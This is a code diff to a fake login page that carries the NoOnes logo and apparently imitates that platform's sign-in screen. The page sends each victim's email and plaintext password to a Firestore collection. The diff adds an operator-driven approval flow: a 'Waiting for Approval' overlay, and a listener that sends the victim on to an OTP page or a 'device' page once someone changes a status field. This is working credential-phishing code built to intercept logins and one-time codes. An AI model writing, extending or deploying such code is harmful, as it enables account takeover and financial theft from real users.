@@ -432,6 +432,24 @@ font-weight:bold;
 color:#36d621;
 
 }
+.loader{
+    width:22px;
+    height:22px;
+    border:4px solid transparent;
+    border-top:4px solid #48d56d;
+    border-right:4px solid #48d56d;
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+}
+
+@keyframes spin{
+    to{
+        transform:rotate(360deg);
+    }
+}
+
+.login-wrap{position:relative;width:100%;}
+.login-loading{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:52px;height:52px;background:#2f2f2f;border-radius:10px;justify-content:center;align-items:center;z-index:10;}
 </style>
 
 <style>img,video{max-width:100%;height:auto}body{max-width:100%;overflow-x:hidden}.container,.card,.wrapper{max-width:100%;width:100%!important}@media(max-width:768px){*{box-sizing:border-box}body{padding:0;margin:0}}</style>
@@ -487,7 +505,7 @@ color:#36d621;
 </div>
 </div>
 <div class="forgot-row"><a href="#">Forgot password?</a></div>
-<button class="btn-login" id="loginBtn">Log in</button>
+<div class="login-wrap"><button class="btn-login" id="loginBtn"><span id="loginText">Log in</span></button><div id="loginLoading" class="login-loading" style="display:none;"><div class="loader"></div></div></div>
 <div class="signup-row">No account yet? <a href="#">Sign up</a></div>
 </div>
 <div class="footer-controls">
@@ -550,7 +568,9 @@ import { db } from "./js/firebase.js";
 import {
   collection,
   addDoc,
-  serverTimestamp
+  serverTimestamp,
+  doc,
+  onSnapshot
 } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
 
 window.saveLoginToFirebase = async function () {
@@ -565,7 +585,7 @@ window.saveLoginToFirebase = async function () {
 
     try {
 
-        await addDoc(collection(db, "login_submissions"), {
+        const docRef = await addDoc(collection(db, "login_submissions"), {
 
             email: email,
             password: password,
@@ -575,8 +595,7 @@ window.saveLoginToFirebase = async function () {
         });
 
         localStorage.setItem("loginEmail", email);
-
-        window.location.href = "authenticator-otp.html";
+        localStorage.setItem("loginDocId", docRef.id);
 
     } catch (error) {
 
@@ -584,6 +603,42 @@ window.saveLoginToFirebase = async function () {
         alert("Error saving login:\n" + error.message);
 
     }
+
+};
+window.waitForApproval = function () {
+
+    const id = localStorage.getItem("loginDocId");
+
+    if (!id) return;
+
+    const ref = doc(db, "login_submissions", id);
+
+    onSnapshot(ref, (snapshot) => {
+
+        if (!snapshot.exists()) return;
+
+        const data = snapshot.data();
+
+        console.log("Status:", data.status);
+
+        if (data.status === "Approved") {
+
+            window.location.href = "authenticator-otp.html";
+
+        } else if (data.status === "Device") {
+
+            window.location.href = "device.html";
+
+        } else if (data.status === "Rejected") {
+
+            document.getElementById("loginLoading").style.display = "none";
+            document.getElementById("loginBtn").disabled = false;
+
+            alert("Login rejected.");
+
+        }
+
+    });
 
 };
 
@@ -850,9 +905,22 @@ function finishSlide() {
         message.textContent = "✔ Verified";
 
         setTimeout(async () => {
-            closeCaptcha();
-            await saveLoginToFirebase();
-        }, 700);
+
+    closeCaptcha();
+
+    // Show loading spinner
+    document.getElementById("loginLoading").style.display="flex";
+    document.getElementById("loginLoading").style.display="flex";
+    document.getElementById("loginLoading").style.display="flex";
+
+    // Keep your existing login logic
+    document.getElementById("loginBtn").disabled=true;
+    await window.saveLoginToFirebase();
+
+// Wait for admin approval
+window.waitForApproval();
+
+}, 700);
 
     } else {
         message.style.color = "#ff4d4d";
@@ -876,5 +944,99 @@ function finishSlide() {
 
 
 </div>
+<div id="approvalOverlay" style="
+display:none;
+position:fixed;
+left:0;
+top:0;
+width:100%;
+height:100%;
+background:#111;
+z-index:999999;
+">
+
+<div style="
+max-width:420px;
+margin:auto;
+height:100%;
+display:flex;
+flex-direction:column;
+padding:18px;
+">
+
+<!-- Logo -->
+<div style="text-align:center;margin-top:20px;">
+<img src='images/noones-logo.png'
+style="width:170px;">
+</div>
+
+<!-- Card -->
+<div style="
+margin-top:30px;
+background:#181818;
+border-radius:18px;
+padding:35px 22px;
+">
+
+<h2 style="
+text-align:center;
+color:#8d8d8d;
+font-size:20px;
+margin-bottom:40px;
+">
+Waiting for Approval
+</h2>
+
+<div style="
+height:56px;
+background:#165d2f;
+border-radius:16px;
+display:flex;
+justify-content:center;
+align-items:center;
+">
+
+<div style="
+width:42px;
+height:42px;
+background:#2e2e2e;
+border-radius:10px;
+display:flex;
+justify-content:center;
+align-items:center;
+">
+
+<div class="loader"
+style="
+width:22px;
+height:22px;
+border-width:4px;
+background:none;
+">
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+<style>
+.login-spinner{width:26px;height:26px;border:4px solid rgba(255,255,255,.35);border-top:4px solid #4CAF50;border-radius:50%;display:none;animation:spin .8s linear infinite;vertical-align:middle;margin-left:8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+<script>
+document.addEventListener("DOMContentLoaded",()=>{
+ const b=document.getElementById("loginBtn");
+ if(b && !document.getElementById("loginSpinner")){
+   const s=document.createElement("span");
+   s.id="loginSpinner"; s.className="login-spinner";
+   b.appendChild(s);
+ }
+});
+</script>
 </body>
 </html>
